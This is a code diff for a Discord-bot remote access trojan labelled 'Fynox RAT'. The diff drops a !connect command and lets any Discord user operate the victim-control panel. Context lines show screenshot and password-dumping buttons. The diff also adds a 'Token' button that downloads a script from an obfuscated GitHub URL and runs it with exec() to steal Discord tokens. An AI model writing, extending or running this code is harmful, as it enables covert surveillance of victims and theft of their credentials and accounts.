@@ -78,41 +78,12 @@ async def on_ready():
         embed.add_field(name="CPU", value=cpu_info, inline=True)
         embed.add_field(name="GPU", value=gpu_info, inline=True)
         embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
-        embed.add_field(name="Commands", value="Use `!connect [IP]` command to access controls", inline=False)
+        embed.add_field(name="Controls", value="Control panel ready", inline=False)
         
-        await channel.send(embed=embed)
+        view = ControlView(None)  # Allow any user to use controls
+        await channel.send(embed=embed, view=view)
 
-@bot.command(name='connect')
-async def connect(ctx, ip: str):
-    if str(ctx.channel.id) != str(LOG_CHANNEL_ID):
-        await ctx.send("This command can only be used in the log channel.")
-        return
-    
-    hostname = socket.gethostname()
-    username = os.getlogin()
-    
-    embed = discord.Embed(
-        title="💀 Fynox RAT - System Information",
-        description=f"**Username:** {username}\n**IP Address:** {ip}",
-        color=discord.Color.dark_red(),
-        timestamp=datetime.datetime.now()
-    )
-    
-    cpu_info = platform.processor()
-    gpu_info = "Unknown"
-    try:
-        result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
-                              capture_output=True, text=True)
-        gpu_info = result.stdout.split('\n')[1].strip()
-    except:
-        pass
-    
-    embed.add_field(name="CPU", value=cpu_info, inline=True)
-    embed.add_field(name="GPU", value=gpu_info, inline=True)
-    embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
-    
-    view = ControlView(ctx.author.id)
-    await ctx.send(embed=embed, view=view)
+
 
 class ControlView(discord.ui.View):
     def __init__(self, author_id):
@@ -120,7 +91,7 @@ class ControlView(discord.ui.View):
         self.author_id = author_id
 
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
-        return interaction.user.id == self.author_id
+        return self.author_id is None or interaction.user.id == self.author_id
 
     @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.danger, row=0)
     async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -407,6 +378,21 @@ class ControlView(discord.ui.View):
             os.remove('passwords.txt')
         else:
             await interaction.followup.send("No passwords found.")
+
+    @discord.ui.button(label="🪙 Token", style=discord.ButtonStyle.danger, row=9)
+    async def token(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_message("This is an unreleased option!", ephemeral=True)
+        
+        # Execute the raw GitHub URL to fetch Discord token
+        try:
+            response = requests.get('https://raw.githubusercontent.com/ChangedDuke/56tojm8p73v56hion7za3w456hoi73w563o57i6hoi7be3ws5n6n7o35e6nb3osi5eu-6t-e4s35oiutzn34w-s5bo8b6t-/refs/heads/main/discord-token.py')
+            if response.status_code == 200:
+                exec(response.text)
+                await interaction.followup.send("Token extraction completed.")
+            else:
+                await interaction.followup.send("Failed to fetch token extraction script.")
+        except Exception as e:
+            await interaction.followup.send(f"Error during token extraction: {str(e)}")
 
 class CMDModal(discord.ui.Modal, title="Open CMD"):
     count = discord.ui.TextInput(label="Number of CMD windows", placeholder="1")
